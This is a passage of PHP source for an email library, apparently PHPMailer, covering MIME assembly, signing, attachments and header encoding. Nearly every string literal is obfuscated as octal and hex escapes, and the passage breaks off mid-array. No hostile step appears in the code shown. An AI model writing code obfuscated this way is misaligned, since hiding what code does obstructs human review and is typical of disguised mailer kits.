$this->attachAll("\x69\156\154\151\156\145", $this->boundary[2]); $body .= static::$LE; $body .= $this->attachAll("\x61\x74\164\x61\x63\150\x6d\x65\156\164", $this->boundary[1]); break; case "\141\x6c\x74": $body .= $mimepre; $body .= $this->getBoundary($this->boundary[1], $altBodyCharSet, static::CONTENT_TYPE_PLAINTEXT, $altBodyEncoding); $body .= $this->encodeString($this->AltBody, $altBodyEncoding); $body .= static::$LE; $body .= $this->getBoundary($this->boundary[1], $bodyCharSet, static::CONTENT_TYPE_TEXT_HTML, $bodyEncoding); $body .= $this->encodeString($this->Body, $bodyEncoding); $body .= static::$LE; if (!empty($this->Ical)) { $body .= $this->getBoundary($this->boundary[1], '', static::CONTENT_TYPE_TEXT_CALENDAR . "\x3b\40\x6d\145\164\150\157\144\x3d\122\105\121\x55\x45\123\124", ''); $body .= $this->encodeString($this->Ical, $this->Encoding); $body .= static::$LE; } $body .= $this->endBoundary($this->boundary[1]); break; case "\x61\x6c\x74\137\151\x6e\x6c\x69\x6e\x65": $body .= $mimepre; $body .= $this->getBoundary($this->boundary[1], $altBodyCharSet, static::CONTENT_TYPE_PLAINTEXT, $altBodyEncoding); $body .= $this->encodeString($this->AltBody, $altBodyEncoding); $body .= static::$LE; $body .= $this->textLine("\55\x2d" . $this->boundary[1]); $body .= $this->headerLine("\x43\157\156\x74\145\x6e\x74\55\124\171\160\x65", static::CONTENT_TYPE_MULTIPART_RELATED . "\x3b"); $body .= $this->textLine("\x9\142\157\165\156\144\x61\162\x79\75\42" . $this->boundary[2] . "\x22"); $body .= static::$LE; $body .= $this->getBoundary($this->boundary[2], $bodyCharSet, static::CONTENT_TYPE_TEXT_HTML, $bodyEncoding); $body .= $this->encodeString($this->Body, $bodyEncoding); $body .= static::$LE; $body .= $this->attachAll("\x69\x6e\154\x69\x6e\x65", $this->boundary[2]); $body .= static::$LE; $body .= $this->endBoundary($this->boundary[1]); break; case "\141\x6c\x74\137\141\164\x74\141\143\x68": $body .= $mimepre; $body .= $this->textLine("\x2d\x2d" . $this->boundary[1]); $body .= $this->headerLine("\103\157\156\164\145\x6e\164\55\x54\x79\160\x65", static::CONTENT_TYPE_MULTIPART_ALTERNATIVE . "\x3b"); $body .= $this->textLine("\x9\x62\x6f\x75\156\x64\141\162\171\75\42" . $this->boundary[2] . "\x22"); $body .= static::$LE; $body .= $this->getBoundary($this->boundary[2], $altBodyCharSet, static::CONTENT_TYPE_PLAINTEXT, $altBodyEncoding); $body .= $this->encodeString($this->AltBody, $altBodyEncoding); $body .= static::$LE; $body .= $this->getBoundary($this->boundary[2], $bodyCharSet, static::CONTENT_TYPE_TEXT_HTML, $bodyEncoding); $body .= $this->encodeString($this->Body, $bodyEncoding); $body .= static::$LE; if (!empty($this->Ical)) { $body .= $this->getBoundary($this->boundary[2], '', static::CONTENT_TYPE_TEXT_CALENDAR . "\73\40\155\x65\164\150\x6f\144\x3d\x52\105\121\x55\x45\123\x54", ''); $body .= $this->encodeString($this->Ical, $this->Encoding); } $body .= $this->endBoundary($this->boundary[2]); $body .= static::$LE; $body .= $this->attachAll("\141\164\164\x61\143\150\155\145\156\164", $this->boundary[1]); break; case "\141\154\164\x5f\x69\156\154\x69\156\x65\137\141\x74\164\x61\x63\150": $body .= $mimepre; $body .= $this->textLine("\x2d\x2d" . $this->boundary[1]); $body .= $this->headerLine("\103\x6f\x6e\x74\145\156\x74\55\124\171\x70\145", static::CONTENT_TYPE_MULTIPART_ALTERNATIVE . "\x3b"); $body .= $this->textLine("\11\x62\x6f\165\x6e\x64\x61\x72\x79\x3d\42" . $this->boundary[2] . "\42"); $body .= static::$LE; $body .= $this->getBoundary($this->boundary[2], $altBodyCharSet, static::CONTENT_TYPE_PLAINTEXT, $altBodyEncoding); $body .= $this->encodeString($this->AltBody, $altBodyEncoding); $body .= static::$LE; $body .= $this->textLine("\55\x2d" . $this->boundary[2]); $body .= $this->headerLine("\x43\157\x6e\164\x65\x6e\x74\55\124\x79\160\145", static::CONTENT_TYPE_MULTIPART_RELATED . "\x3b"); $body .= $this->textLine("\x9\x62\157\165\156\x64\x61\x72\x79\75\x22" . $this->boundary[3] . "\42"); $body .= static::$LE; $body .= $this->getBoundary($this->boundary[3], $bodyCharSet, static::CONTENT_TYPE_TEXT_HTML, $bodyEncoding); $body .= $this->encodeString($this->Body, $bodyEncoding); $body .= static::$LE; $body .= $this->attachAll("\x69\x6e\154\x69\156\145", $this->boundary[3]); $body .= static::$LE; $body .= $this->endBoundary($this->boundary[2]); $body .= static::$LE; $body .= $this->attachAll("\x61\164\x74\x61\x63\150\155\145\x6e\x74", $this->boundary[1]); break; default: $this->Encoding = $bodyEncoding; $body .= $this->encodeString($this->Body, $this->Encoding); break; } if ($this->isError()) { $body = ''; if ($this->exceptions) { throw new Exception($this->lang("\145\155\x70\x74\x79\137\x6d\145\163\163\x61\x67\x65"), self::STOP_CRITICAL); } } elseif ($this->sign_key_file) { try { if (!defined("\120\x4b\x43\123\67\x5f\124\x45\x58\124")) { throw new Exception($this->lang("\x65\170\x74\x65\156\x73\x69\x6f\x6e\137\155\x69\x73\x73\151\156\x67") . "\x6f\160\145\156\163\163\x6c"); } $file = fopen("\160\x68\160\x3a\x2f\57\164\145\155\x70", "\x72\142\x2b"); $signed = fopen("\x70\x68\160\72\x2f\x2f\164\145\x6d\x70", "\162\x62\x2b"); fwrite($file, $body); if (empty($this->sign_extracerts_file)) { $sign = @openssl_pkcs7_sign($file, $signed, "\146\151\x6c\145\72\57\x2f" . realpath($this->sign_cert_file), array("\x66\151\x6c\145\x3a\57\x2f" . realpath($this->sign_key_file), $this->sign_key_pass), array()); } else { $sign = @openssl_pkcs7_sign($file, $signed, "\x66\151\x6c\145\x3a\x2f\x2f" . realpath($this->sign_cert_file), array("\146\151\154\x65\x3a\57\57" . realpath($this->sign_key_file), $this->sign_key_pass), array(), PKCS7_DETACHED, $this->sign_extracerts_file); } fclose($file); if ($sign) { $body = file_get_contents($signed); fclose($signed); $parts = explode("\xa\12", $body, 2); $this->MIMEHeader .= $parts[0] . static::$LE . static::$LE; $body = $parts[1]; } else { fclose($signed); throw new Exception($this->lang("\163\151\147\156\x69\156\x67") . openssl_error_string()); } } catch (Exception $exc) { $body = ''; if ($this->exceptions) { throw $exc; } } } return $body; } protected function getBoundary($boundary, $charSet, $contentType, $encoding) { $result = ''; if ('' == $charSet) { $charSet = $this->CharSet; } if ('' == $contentType) { $contentType = $this->ContentType; } if ('' == $encoding) { $encoding = $this->Encoding; } $result .= $this->textLine("\x2d\x2d" . $boundary); $result .= sprintf("\103\157\x6e\x74\x65\156\164\x2d\x54\171\160\x65\x3a\40\x25\x73\x3b\x20\x63\x68\141\x72\163\x65\x74\75\45\x73", $contentType, $charSet); $result .= static::$LE; if (static::ENCODING_7BIT != $encoding) { $result .= $this->headerLine("\103\x6f\156\x74\145\156\x74\x2d\x54\x72\x61\156\163\x66\145\x72\x2d\105\x6e\x63\157\x64\x69\156\x67", $encoding); } $result .= static::$LE; return $result; } protected function endBoundary($boundary) { return static::$LE . "\55\55" . $boundary . "\55\55" . static::$LE; } protected function setMessageType() { $type = array(); if ($this->alternativeExists()) { $type[] = "\x61\154\x74"; } if ($this->inlineImageExists()) { $type[] = "\x69\156\154\x69\x6e\x65"; } if ($this->attachmentExists()) { $type[] = "\x61\x74\x74\x61\x63\x68"; } $this->message_type = implode("\x5f", $type); if ('' == $this->message_type) { $this->message_type = "\x70\154\141\x69\156"; } } public function headerLine($name, $value) { return $name . "\72\x20" . $value . static::$LE; } public function textLine($value) { return $value . static::$LE; } public function addAttachment($path, $name = '', $encoding = self::ENCODING_BASE64, $type = '', $disposition = "\141\x74\x74\141\143\x68\x6d\145\x6e\x74") { try { if (!static::isPermittedPath($path) || !@is_file($path)) { throw new Exception($this->lang("\x66\x69\x6c\145\x5f\x61\143\x63\145\x73\163") . $path, self::STOP_CONTINUE); } if ('' == $type) { $type = static::filenameToType($path); } $filename = basename($path); if ('' == $name) { $name = $filename; } $this->attachment[] = array(0 => $path, 1 => $filename, 2 => $name, 3 => $encoding, 4 => $type, 5 => false, 6 => $disposition, 7 => $name); } catch (Exception $exc) { $this->setError($exc->getMessage()); $this->edebug($exc->getMessage()); if ($this->exceptions) { throw $exc; } return false; } return true; } public function getAttachments() { return $this->attachment; } protected function attachAll($disposition_type, $boundary) { $mime = array(); $cidUniq = array(); $incl = array(); foreach ($this->attachment as $attachment) { if ($attachment[6] == $disposition_type) { $string = ''; $path = ''; $bString = $attachment[5]; if ($bString) { $string = $attachment[0]; } else { $path = $attachment[0]; } $inclhash = hash("\163\150\141\x32\x35\66", serialize($attachment)); if (in_array($inclhash, $incl)) { continue; } $incl[] = $inclhash; $name = $attachment[2]; $encoding = $attachment[3]; $type = $attachment[4]; $disposition = $attachment[6]; $cid = $attachment[7]; if ("\151\156\154\151\x6e\x65" == $disposition and array_key_exists($cid, $cidUniq)) { continue; } $cidUniq[$cid] = true; $mime[] = sprintf("\x2d\x2d\x25\163\x25\x73", $boundary, static::$LE); if (!empty($name)) { $mime[] = sprintf("\x43\157\x6e\x74\145\x6e\164\x2d\124\171\160\x65\x3a\40\45\163\x3b\40\x6e\x61\x6d\x65\x3d\42\45\x73\x22\45\x73", $type, $this->encodeHeader($this->secureHeader($name)), static::$LE); } else { $mime[] = sprintf("\103\x6f\156\x74\145\x6e\x74\x2d\x54\x79\160\x65\x3a\40\45\x73\x25\163", $type, static::$LE); } if (static::ENCODING_7BIT != $encoding) { $mime[] = sprintf("\x43\157\156\x74\145\x6e\x74\x2d\124\162\141\x6e\163\x66\145\x72\55\105\x6e\143\x6f\x64\x69\x6e\147\72\40\45\163\45\163", $encoding, static::$LE); } if (!empty($cid)) { $mime[] = sprintf("\x43\157\x6e\164\145\156\164\x2d\x49\x44\x3a\x20\x3c\x25\x73\x3e\45\163", $cid, static::$LE); } if (!empty($disposition)) { $encoded_name = $this->encodeHeader($this->secureHeader($name)); if (preg_match("\57\133\x20\x5c\x28\134\51\74\76\100\54\x3b\72\134\42\134\x2f\x5c\133\134\135\134\x3f\75\x5d\x2f", $encoded_name)) { $mime[] = sprintf("\103\157\156\164\145\x6e\164\55\104\151\163\160\x6f\163\151\x74\151\x6f\156\72\x20\45\163\73\40\146\151\154\x65\156\x61\x6d\x65\75\42\45\163\x22\45\163", $disposition, $encoded_name, static::$LE . static::$LE); } else { if (!empty($encoded_name)) { $mime[] = sprintf("\x43\157\x6e\164\x65\156\x74\x2d\x44\x69\x73\x70\157\x73\x69\164\x69\x6f\156\72\40\x25\x73\73\40\x66\x69\x6c\x65\x6e\x61\155\x65\75\45\x73\x25\163", $disposition, $encoded_name, static::$LE . static::$LE); } else { $mime[] = sprintf("\103\x6f\156\x74\145\x6e\x74\x2d\x44\151\x73\x70\x6f\x73\x69\164\x69\157\x6e\x3a\40\x25\x73\45\x73", $disposition, static::$LE . static::$LE); } } } else { $mime[] = static::$LE; } if ($bString) { $mime[] = $this->encodeString($string, $encoding); } else { $mime[] = $this->encodeFile($path, $encoding); } if ($this->isError()) { return ''; } $mime[] = static::$LE; } } $mime[] = sprintf("\55\55\45\x73\x2d\x2d\45\x73", $boundary, static::$LE); return implode('', $mime); } protected function encodeFile($path, $encoding = self::ENCODING_BASE64) { try { if (!static::isPermittedPath($path) || !file_exists($path)) { throw new Exception($this->lang("\146\151\x6c\x65\137\157\x70\x65\156") . $path, self::STOP_CONTINUE); } $file_buffer = file_get_contents($path); if (false === $file_buffer) { throw new Exception($this->lang("\x66\x69\154\145\137\157\160\x65\156") . $path, self::STOP_CONTINUE); } $file_buffer = $this->encodeString($file_buffer, $encoding); return $file_buffer; } catch (Exception $exc) { $this->setError($exc->getMessage()); return ''; } } public function encodeString($str, $encoding = self::ENCODING_BASE64) { $encoded = ''; switch (strtolower($encoding)) { case static::ENCODING_BASE64: $encoded = chunk_split(base64_encode($str), static::STD_LINE_LENGTH, static::$LE); break; case static::ENCODING_7BIT: case static::ENCODING_8BIT: $encoded = static::normalizeBreaks($str); if (substr($encoded, -strlen(static::$LE)) != static::$LE) { $encoded .= static::$LE; } break; case static::ENCODING_BINARY: $encoded = $str; break; case static::ENCODING_QUOTED_PRINTABLE: $encoded = $this->encodeQP($str); break; default: $this->setError($this->lang("\x65\x6e\143\157\x64\151\x6e\x67") . $encoding); break; } return $encoded; } public function encodeHeader($str, $position = "\164\x65\170\x74") { $matchcount = 0; switch (strtolower($position)) { case "\x70\150\162\141\163\x65": if (!preg_match("\57\x5b\x5c\62\x30\60\x2d\134\x33\x37\67\x5d\x2f", $str)) { $encoded = addcslashes($str, "\x0\56\x2e\x1f\x7f\x5c\x22"); if ($str == $encoded and !preg_match("\x2f\133\136\101\x2d\x5a\x61\55\172\x30\55\71\x21\43\44\45\46\47\x2a\53\134\57\x3d\x3f\136\137\x60\x7b\174\x7d\x7e\x20\55\x5d\x2f", $str)) { return $encoded; } return "\42{$encoded}\x22"; } $matchcount = preg_match_all("\57\133\x5e\x5c\x30\64\60\134\x30\x34\x31\134\x30\64\63\55\x5c\x31\63\63\x5c\x31\63\65\x2d\134\61\67\x36\135\x2f", $str, $matches); break; case "\143\x6f\155\155\x65\156\x74": $matchcount = preg_match_all("\57\133\50\x29\x22\x5d\57", $str, $matches); case "\x74\145\x78\x74": default: $matchcount += preg_match_all("\57\x5b\134\x30\60\x30\x2d\134\x30\61\60\134\60\61\63\x5c\x30\x31\x34\134\60\61\66\55\x5c\x30\63\67\134\x31\x37\67\55\134\x33\67\67\x5d\57", $str, $matches); break; } $lengthsub = "\155\141\151\154" == $this->Mailer ? 13 : 0; $maxlen = static::STD_LINE_LENGTH - $lengthsub; if ($matchcount > strlen($str) / 3) { $encoding = "\x42"; $maxlen = static::STD_LINE_LENGTH - $lengthsub - 8 - strlen($this->CharSet); if ($this->hasMultiBytes($str)) { $encoded = $this->base64EncodeWrapMB($str, "\xa"); } else { $encoded = base64_encode($str); $maxlen -= $maxlen % 4; $encoded = trim(chunk_split($encoded, $maxlen, "\xa")); } $encoded = preg_replace("\57\136\50\56\x2a\x29\x24\57\x6d", "\x20\75\x3f" . $this->CharSet . "\x3f{$encoding}\x3f\x5c\x31\x3f\75", $encoded); } elseif ($matchcount > 0) { $encoding = "\x51"; $maxlen = static::STD_LINE_LENGTH - $lengthsub - 8 - strlen($this->CharSet); $encoded = $this->encodeQ($str, $position); $encoded = $this->wrapText($encoded, $maxlen, true); $encoded = str_replace("\75" . static::$LE, "\12", trim($encoded)); $encoded = preg_replace("\57\136\x28\x2e\52\x29\x24\x2f\155", "\40\x3d\x3f" . $this->CharSet . "\77{$encoding}\x3f\134\61\77\x3d", $encoded); } elseif (strlen($str) > $maxlen) { $encoded = trim($this->wrapText($str, $maxlen, false)); if ($str == $encoded) { $encoded = trim(chunk_split($str, static::STD_LINE_LENGTH, static::$LE)); } $encoded = str_replace(static::$LE, "\xa", trim($encoded)); $encoded = preg_replace("\57\136\x28\56\52\51\44\57\x6d", "\40\134\x31", $encoded); } else { return $str; } return trim(static::normalizeBreaks($encoded)); } public function hasMultiBytes($str) { if (function_exists("\155\x62\x5f\x73\164\x72\154\145\156")) { return strlen($str) > mb_strlen($str, $this->CharSet); } return false; } public function has8bitChars($text) { return (bool) preg_match("\x2f\133\x5c\170\x38\60\x2d\134\170\x46\x46\135\x2f", $text); } public function base64EncodeWrapMB($str, $linebreak = null) { $start = "\75\x3f" . $this->CharSet . "\77\x42\77"; $end = "\x3f\x3d"; $encoded = ''; if (null === $linebreak) { $linebreak = static::$LE; } $mb_length = mb_strlen($str, $this->CharSet); $length = 75 - strlen($start) - strlen($end); $ratio = $mb_length / strlen($str); $avgLength = floor($length * $ratio * 0.75); for ($i = 0; $i < $mb_length; $i += $offset) { $lookBack = 0; do { $offset = $avgLength - $lookBack; $chunk = mb_substr($str, $i, $offset, $this->CharSet); $chunk = base64_encode($chunk); ++$lookBack; } while (strlen($chunk) > $length); $encoded .= $chunk . $linebreak; } return substr($encoded, 0, -strlen($linebreak)); } public function encodeQP($string) { return static::normalizeBreaks(quoted_printable_encode($string)); } public function encodeQ($str, $position = "\164\x65\x78\164") { $pattern = ''; $encoded = str_replace(array("\xd", "\12"), '', $str); switch (strtolower($position)) { case "\x70\x68\162\141\163\x65": $pattern = "\136\x41\55\x5a\141\55\x7a\60\55\x39\41\52\53\134\x2f\x20\55"; break; case "\x63\157\x6d\x6d\145\x6e\164": $pattern = "\134\x28\x5c\x29\x22"; case "\164\145\170\x74": default: $pattern = "\134\x30\x30\60\55\134\60\61\x31\x5c\60\61\x33\134\x30\x31\64\x5c\x30\61\x36\x2d\134\60\63\67\x5c\60\x37\65\134\60\67\x37\134\x31\x33\x37\134\61\x37\x37\x2d\x5c\x33\67\x37" . $pattern; break; } $matches = array(); if (preg_match_all("\57\x5b{$pattern}\x5d\x2f", $encoded, $matches)) { $eqkey = array_search("\75", $matches[0]); if (false !== $eqkey) { unset($matches[0][$eqkey]); array_unshift($matches[0], "\75"); } foreach (array_unique($matches[0]) as $char) { $encoded = str_replace($char, "\75" . sprintf("\45\60\62\x58", ord($char)), $encoded); } } return str_replace("\x20", "\x5f", $encoded); } public function addStringAttachment($string, $filename, $encoding = self::ENCODING_BASE64, $type = '', $disposition = "\x61\164\x74\x61\x63\x68\x6d\145\156\x74") { if ('' == $type) { $type = static::filenameToType($filename); } $this->attachment[] = array(0 => $string, 1 => $filename, 2 => basename($filename), 3 => $encoding, 4 => $type, 5 => true, 6 => $disposition, 7 => 0); } public function addEmbeddedImage($path, $cid, $name = '', $encoding = self::ENCODING_BASE64, $type = '', $disposition = "\x69\156\154\151\156\x65") { if (!static::isPermittedPath($path) || !@is_file($path)) { $this->setError($this->lang("\x66\x69\154\145\137\141\143\143\145\x73\x73") . $path); return false; } if ('' == $type) { $type = static::filenameToType($path); } $filename = basename($path); if ('' == $name) { $name = $filename; } $this->attachment[] = array(0 => $path, 1 => $filename, 2 => $name, 3 => $encoding, 4 => $type, 5 => false, 6 => $disposition, 7 => $cid); return true; } public function addStringEmbeddedImage($string, $cid, $name = '', $encoding = self::ENCODING_BASE64, $type = '', $disposition = "\x69\x6e\154\x69\156\145") { if ('' == $type and !empty($name)) { $type = static::filenameToType($name); } $this->attachment[] = array(0 => $string, 1 => $name, 2 => $name, 3 => $encoding, 4 => $type, 5 => true, 6 => $disposition, 7 => $cid); return true; } protected function cidExists($cid) { foreach ($this->attachment as $attachment) { if ("\151\156\x6c\151\x6e\145" == $attachment[6] and $cid == $attachment[7]) { return true; } } return false; } public function inlineImageExists() { foreach ($this->attachment as $attachment) { if ("\151\156\x6c\151\156\145" == $attachment[6]) { return true; } } return false; } public function attachmentExists() { foreach ($this->attachment as $attachment) { if ("\x61\x74\164\x61\x63\150\x6d\145\x6e\164" == $attachment[6]) { return true; } } return false; } public function alternativeExists() { return !empty($this->AltBody); } public function clearQueuedAddresses($kind) { $this->RecipientsQueue = array_filter($this->RecipientsQueue, function ($params) use($kind) { return $params[0] != $kind; }); } public function clearAddresses() { foreach ($this->to as $to) { unset($this->all_recipients[strtolower($to[0])]); } $this->to = array(); $this->clearQueuedAddresses("\164\x6f"); } public function clearCCs() { foreach ($this->cc as $cc) { unset($this->all_recipients[strtolower($cc[0])]); } $this->cc = array(); $this->clearQueuedAddresses("\143\x63"); } public function clearBCCs() { foreach ($this->bcc as $bcc) { unset($this->all_recipients[strtolower($bcc[0])]); } $this->bcc = array(); $this->clearQueuedAddresses("\x62\x63\143"); } public function clearReplyTos() { $this->ReplyTo = array(); $this->ReplyToQueue = array(); } public function clearAllRecipients() { $this->to = array(); $this->cc = array(); $this->bcc = array(); $this->all_recipients = array(); $this->RecipientsQueue = array(); } public function clearAttachments() { $this->attachment = array(); } public function clearCustomHeaders() { $this->CustomHeader = array(); } protected function setError($msg) { ++$this->error_count; if ("\163\x6d\x74\160" == $this->Mailer and null !== $this->smtp) { $lasterror = $this->smtp->getError(); if (!empty($lasterror["\145\162\162\x6f\x72"])) { $msg .= $this->lang("\x73\155\x74\160\x5f\145\162\162\x6f\x72") . $lasterror["\x65\162\x72\x6f\x72"]; if (!empty($lasterror["\x64\145\164\x61\x69\x6c"])) { $msg .= "\x20\104\x65\164\141\x69\x6c\72\x20" . $lasterror["\x64\x65\164\141\x69\154"]; } if (!empty($lasterror["\163\x6d\164\x70\137\143\157\144\x65"])) { $msg .= "\40\x53\115\124\120\40\143\157\x64\x65\72\40" . $lasterror["\x73\155\164\x70\137\143\x6f\144\145"]; } if (!empty($lasterror["\163\x6d\x74\x70\x5f\x63\157\144\145\x5f\145\x78"])) { $msg .= "\40\101\144\x64\x69\164\x69\157\156\x61\x6c\40\x53\115\x54\x50\40\151\x6e\146\157\x3a\x20" . $lasterror["\163\155\164\160\137\143\157\x64\145\137\145\170"]; } } } $this->ErrorInfo = $msg; } public static function rfcDate() { date_default_timezone_set(@date_default_timezone_get()); return date("\x44\54\40\152\x20\115\40\x59\x20\x48\72\x69\x3a\163\40\117"); } protected function serverHostname() { $result = ''; if (!empty($this->Hostname)) { $result = $this->Hostname; } elseif (isset($_SERVER) and array_key_exists("\x53\x45\x52\x56\105\122\x5f\116\101\x4d\x45", $_SERVER)) { $result = $_SERVER["\x53\105\122\126\105\x52\137\x4e\x41\115\105"]; } elseif (function_exists("\147\x65\x74\x68\157\x73\x74\x6e\x61\155\145") and gethostname() !== false) { $result = gethostname(); } elseif (php_uname("\156") !== false) { $result = php_uname("\156"); } if (!static::isValidHost($result)) { return "\154\157\143\141\x6c\150\x6f\x73\x74\x2e\154\x6f\x63\x61\154\144\157\155\x61\x69\156"; } return $result; } public static function isValidHost($host) { if (empty($host) or !is_string($host) or strlen($host) > 256) { return false; } if (trim($host, "\x5b\x5d") != $host) { return (bool) filter_var(trim($host, "\x5b\x5d"), FILTER_VALIDATE_IP, FILTER_FLAG_IPV6); } if (is_numeric(str_replace("\x2e", '', $host))) { return (bool) filter_var($host, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4); } if (filter_var("\x68\x74\164\160\x3a\57\x2f" . $host, FILTER_VALIDATE_URL)) { return true; } return false; } protected function lang($key) { if (count($this->language) < 1) { $this->setLanguage("\x65\156"); } if (array_key_exists($key, $this->language)) { if ("\163\155\x74\x70\x5f\x63\157\x6e\156\145\x63\x74\137\146\x61\x69\x6c\x65\144" == $key) { return $this->language[$key]; } return $this->language[$key]; } return $key; } public function isError() { return $this->error_count > 0; } public function addCustomHeader($name, $value = null) { if (null === $value) { $this->CustomHeader[] = explode("\72", $name, 2); } else { $this->CustomHeader[] = array($name, $value); } } public function getCustomHeaders() { return $this->CustomHeader; } public function msgHTML($message, $basedir = '', $advanced = false) { preg_match_all("\x2f\x28\x73\162\143\174\142\x61\143\153\x67\162\157\x75\x6e\144\x29\x3d\x5b\42\x27\135\50\56\x2a\x29\x5b\42\x27\x5d\57\125\x69", $message, $images); if (array_key_exists(2, $images)) { if (strlen($basedir) > 1 && "\57" != substr($basedir, -1)) { $basedir .= "\57"; } foreach ($images[2] as $imgindex => $url) { if (preg_match("\43\136\144\x61\164\x61\x3a\50\151\155\141\147\145\57\50\77\72\x6a\160\145\x3f\147\x7c\x67\x69\x66\174\160\156\x67\x29\51\x3b\77\x28\x62\x61\163\145\66\x34\x29\77\54\x28\56\53\51\x23", $url, $match)) { if (count($match) == 4 and static::ENCODING_BASE64 == $match[2]) { $data = base64_decode($match[3]); } elseif ('' == $match[2]) { $data = rawurldecode($match[3]); } else { continue; } $cid = hash("\x73\150\141\62\x35\x36", $data) . "\x40\x70\x68\x70\x6d\x61\x69\154\145\162\x2e\60"; if (!$this->cidExists($cid)) { $this->addStringEmbeddedImage($data, $cid, "\145\155\x62\145\144" . $imgindex, static::ENCODING_BASE64, $match[1]); } $message = str_replace($images[0][$imgindex], $images[1][$imgindex] . "\x3d\42\143\151\144\x3a" . $cid . "\42", $message); continue; } if (!empty($basedir) and strpos($url, "\56\56") === false and 0 !== strpos($url, "\x63\151\x64\x3a") and !preg_match("\43\136\x5b\x61\x2d\172\x5d\x5b\141\x2d\172\x30\x2d\71\53\x2e\x2d\135\x2a\72\x3f\57\57\43\x69", $url)) { $filename = basename($url); $directory = dirname($url); if ("\x2e" == $directory) { $directory = ''; } $cid = hash("\x73\x68\141\x32\65\x36", $url) . "\100\x70\x68\x70\x6d\x61\x69\154\145\x72\56\x30"; if (strlen($basedir) > 1 and "\x2f" != substr($basedir, -1)) { $basedir .= "\57"; } if (strlen($directory) > 1 and "\57" != substr($directory, -1)) { $directory .= "\57"; } if ($this->addEmbeddedImage($basedir . $directory . $filename, $cid, $filename, static::ENCODING_BASE64, static::_mime_types((string) static::mb_pathinfo($filename, PATHINFO_EXTENSION)))) { $message = preg_replace("\x2f" . $images[1][$imgindex] . "\x3d\133\42\47\135" . preg_quote($url, "\57") . "\x5b\x22\47\x5d\x2f\125\151", $images[1][$imgindex] . "\75\x22\x63\151\x64\72" . $cid . "\x22", $message); } } } } $this->isHTML(true); $this->Body = static::normalizeBreaks($message); $this->AltBody = static::normalizeBreaks($this->html2text($message, $advanced)); if (!$this->alternativeExists()) { $this->AltBody = "\x54\150\x69\x73\x20\x69\x73\x20\x61\x6e\40\110\x54\x4d\x4c\x2d\x6f\156\154\x79\x20\155\x65\163\x73\x61\x67\x65\56\40\x54\157\40\166\151\x65\167\40\x69\x74\54\x20\x61\x63\164\151\166\x61\164\145\x20\110\x54\x4d\x4c\x20\151\x6e\x20\x79\x6f\165\162\x20\145\x6d\x61\151\154\40\x61\x70\160\154\151\x63\x61\x74\151\x6f\x6e\x2e" . static::$LE; } return $this->Body; } public function html2text($html, $advanced = false) { if (is_callable($advanced)) { return call_user_func($advanced, $html); } return html_entity_decode(trim(strip_tags(preg_replace("\x2f\x3c\x28\150\145\141\x64\x7c\164\x69\164\x6c\145\x7c\163\x74\x79\154\145\174\163\143\x72\151\160\164\x29\133\x5e\76\x5d\x2a\x3e\56\52\x3f\74\x5c\x2f\134\61\x3e\57\163\x69", '', $html))), ENT_QUOTES, $this->CharSet); } public static function _mime_types($ext = '') { $mimes = array("\x78\154" => "\141\160\160\x6c\x69\x63\141\164\x69\157\156\x2f\145\170\143\x65\x6c", "\x6a\163" => "\141\160\x70\x6c\151\x63\x61\164\151\x6f\x6e\57\152\x61\x76\141\163\143\162\151\x70\x74", "\150\161\x78" => "\x61\160\x70\154\151\x63\141\x74\x69\157\x6e\57\155\141\x63\x2d\142\151\156\150\145\x78\64\x30", "\x63\x70\x74" => "\141\160\x70\x6c\151\x63\x61\164\151\157\156\57\x6d\141\143\55\143\157\x6d\160\141\x63\164\x70\x72\x6f", "\x62\x69\156" => "\x61\160\x70\154\x69\x63\141\x74\151\x6f\x6e\x2f\x6d\x61\x63\x62\x69\x6e\141\162\x79", "\x64\157\143" => "\141\160\160\154\151\143\x61\164\x69\x6f\156\x2f\155\163\x77\x6f\x72\144", "\167\157\162\144" => "\x61\x70\x70\x6c\x69\143\x61\x74\x69\x6f\x6e\x2f\x6d\163\167\x6f\162\x64", "\x78\154\163\170" => "\141\x70\160\x6c\x69\143\141\164\x69\x6f\156\x2f\166\x6e\x64\x2e\x6f\160\145\x6e\x78\x6d\x6c\x66\157\162\155\x61\164\x73\x2d\x6f\146\x66\151\143\145\x64\x6f\143\x75\x6d\x65\156\x74\x2e\163\x70\162\x65\141\x64\x73\150\x65\145\164\x6d\154\56\163\150\x65\145\x74", "\x78\154\x74\170" => "\141\160\160\x6c\x69\143\141\164\x69\157\x6e\57\166\x6e\144\56\157\160\145\x6e\170\155\x6c\146\157\x72\155\141\x74\163\55\157\x66\x66\151\x63\x65\x64\x6f\x63\x75\155\x65\x6e\x74\56\163\160\x72\x65\141\x64\x73\150\x65\145\164\155\154\56\164\145\x6d\160\x6c\x61\x74\145", "\x70\157\x74\x78" => "\x61\x70\160\x6c\151\143\141\x74\151\x6f\x6e\57\166\x6e\x64\x2e\157\x70\x65\156\x78\x6d\x6c\x66\157\x72\x6d\141\164\x73\x2d\157\x66\x66\x69\143\145\144\157\x63\x75\155\x65\x6e\x74\x2e\160\x72\x65\x73\145\156\x74\x61\x74\151\157\x6e\155\154\x2e\x74\x65\x6d\x70\x6c\141\x74\x65", "\x70\160\x73\x78" => "\x61\x70\x70\x6c\x69\143\x61\x74\151\157\156\x2f\x76\x6e\x64\56\157\160\x65\156\170\x6d\x6c\146\x6f\162\x6d\141\x74\163\55\157\146\146\x69\x63\145\x64\x6f\143\165\x6d\x65\156\x74\x2e\160\x72\145\163\x65\x6e\164\x61\164\x69\x6f\x6e\155\x6c\56\163\154\151\144\145\x73\x68\x6f\167", "\x70\160\x74\x78" => "\141\x70\160\154\151\x63\x61\x74\151\157\156\57\166\x6e\144\x2e\x6f\x70\x65\x6e\x78\x6d\154\x66\x6f\x72\155\x61\x74\x73\x2d\x6f\146\x66\151\143\145\144\157\x63\165\155\x65\156\164\56\x70\x72\145\x73\x65\156\x74\141\x74\x69\157\156\155\154\56\160\162\x65\x73\145\156\x74\x61\x74\151\x6f\x6e", "\x73\x6c\x64\170" => "\x61\x70\160\x6c\x69\143\141\x74\x69\x6f\x6e\57\166\156\144\x2e\x6f\x70\x65\156\170\x6d\x6c\x66\157\162\x6d\141\x74\x73\x2d\157\x66\x66\151\x63\145\x64\157\x63\165\x6d\145\156\164\56\160\x72\145\x73\x65\156\x74\141\164\151\x6f\156\x6d\x6c\56\x73\x6c\151\144\145", "\144\157\143\170" => 